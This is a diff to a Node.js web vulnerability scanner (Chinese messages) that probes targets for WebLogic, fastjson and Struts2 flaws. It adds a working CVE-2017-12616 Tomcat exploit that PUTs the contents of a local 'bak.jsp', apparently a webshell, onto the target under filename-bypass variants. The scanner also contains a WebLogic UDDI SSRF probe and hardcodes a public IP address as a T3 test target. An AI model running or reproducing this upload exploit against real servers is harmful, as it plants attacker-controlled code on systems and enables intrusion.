@@ -1329,6 +1329,7 @@ function testWeblogic(url,fnCbk)
 	
 
 	s += "/uddiexplorer/SearchPublicRegistries.jsp?rdoSearch=name&txtSearchname=sdf&txtSearchkey=&txtSearchfor=&selfor=Business+location&btnSubmit=Search&operator=http://127.0.0.1:7001";
+	// console.log(s)
 	request(fnOptHeader({method:"GET",uri:s}),function(e,r,b)
 	{
 		if(b && 200 == r.statusCode && -1 < b.indexOf("weblolgic.uddi.client"))
@@ -1409,12 +1410,44 @@ function fastjson(url, fnCbk)
 	  );
 }
 
+/*
+CVE-2017-12616 poc
+1、/conf/web.xml
+ <init-param>
+            <param-name>readonly</param-name>
+            <param-value>false</param-value>
+        </init-param>
+2、http://............../
+*/
+var szCode = fs.readFileSync("bak.jsp").toString();
+function fnMyPut(url)
+{
+	url = url.substr(0, url.lastIndexOf('/') + 1);
+	var a = ["bak.jsp%20","bak.jsp/","bak.jsp%00","bak.jsp"];
+	var fnPt = function(u)
+	{
+		request.put({"uri":u,"body":szCode},function(e,r,b)
+		{
+			// console.log([u,r.statusCode,r.headers["location"],e||b]);
+			if(201 == r.statusCode || 204 == r.statusCode)
+			{
+				var oT = g_oRst["tomcat"] || {};
+				oT["CVE-2017-12616"] = "发现高危put CVE-2017-12616漏洞,可访" + u + "问进行测试";
+				g_oRst["tomcat"] = oT;
+			}
+		});
+	};
+	for(var k in a)
+		fnPt(url + a[k]);	
+}
+
 if(!program.test && 0 < a.length)
 {
 	//*
 	if(program.menu)fnCheckTa3(g_szUrl,program.menu || "./urls/ta3menu.txt","一些常见、可能存在风险url检测",'ta3menu');
 	if(program.webshell)fnCheckTa3(g_szUrl,program.webshell || "./urls/webshell.txt", "webshell、木马",'webshell');
 	testWeblogic(g_szUrl);
+	fnMyPut(g_szUrl);
 	doStruts2_001(g_szUrl);
 	doStruts2_005(g_szUrl);
 	doStruts2_007(g_szUrl);
@@ -1452,6 +1485,7 @@ process.on('exit', (code) =>
 if(program.test)
 {
 	console.log("开始内网测试");
+	checkWeblogicT3("125.71.203.122","9088");
 	// doStruts2_016("http://192.168.10.216:8088/S2-016/default.action");
  	
 	// doStruts2_005("http://192.168.10.216:8088/S2-005/example/HelloWorld.action");
